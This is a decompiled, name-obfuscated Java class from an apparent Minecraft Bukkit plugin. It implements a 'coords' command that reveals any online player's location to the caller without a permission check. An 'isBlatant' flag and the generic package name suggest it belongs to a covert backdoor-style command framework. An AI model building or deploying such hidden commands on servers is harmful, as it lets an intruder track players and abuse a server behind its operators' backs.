/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class CoordsCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlIllIlllIIllIllIlI, String lllllllllllllIlIllIlllIIllIllIIl, String[] lllllllllllllIlIllIlllIIllIllIII, Player lllllllllllllIlIllIlllIIllIlIlll) {
        if (lllllllllllllIlIllIlllIIllIllIII.length <= 1) {
            lllllllllllllIlIllIlllIIllIlIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Your coords are: ").append(Settings.RED).append(lllllllllllllIlIllIlllIIllIlIlll.getLocation().getX()).append(", ").append(lllllllllllllIlIllIlllIIllIlIlll.getLocation().getY()).append(", ").append(lllllllllllllIlIllIlllIIllIlIlll.getLocation().getZ()))));
        } else {
            Player lllllllllllllIlIllIlllIIllIlllII = Bukkit.getServer().getPlayer(lllllllllllllIlIllIlllIIllIllIII[1]);
            if (lllllllllllllIlIllIlllIIllIlllII == null) {
                lllllllllllllIlIllIlllIIllIlIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIlIllIlllIIllIllIII[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                lllllllllllllIlIllIlllIIllIlIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllIlIllIlllIIllIlllII.getName()).append("'s coords are: ").append(Settings.RED).append(lllllllllllllIlIllIlllIIllIlllII.getLocation().getX()).append(", ").append(lllllllllllllIlIllIlllIIllIlllII.getLocation().getY()).append(", ").append(lllllllllllllIlIllIlllIIllIlllII.getLocation().getZ()))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public CoordsCommand() {
        CoordsCommand lllllllllllllIlIllIlllIIllllIIII;
    }
}

